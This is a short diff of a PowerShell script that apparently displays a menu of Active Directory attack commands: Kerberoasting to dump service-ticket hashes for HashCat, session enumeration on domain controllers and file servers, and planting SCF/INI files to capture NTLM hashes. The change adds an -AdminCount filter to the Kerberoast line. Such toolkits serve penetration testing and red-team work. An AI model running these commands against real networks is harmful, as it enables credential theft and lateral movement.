@@ -506,7 +506,7 @@ $header = '
         write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
         write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
         write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
-        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
+        write-host " Invoke-Kerberoast -AdminCount -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
         write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
         write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
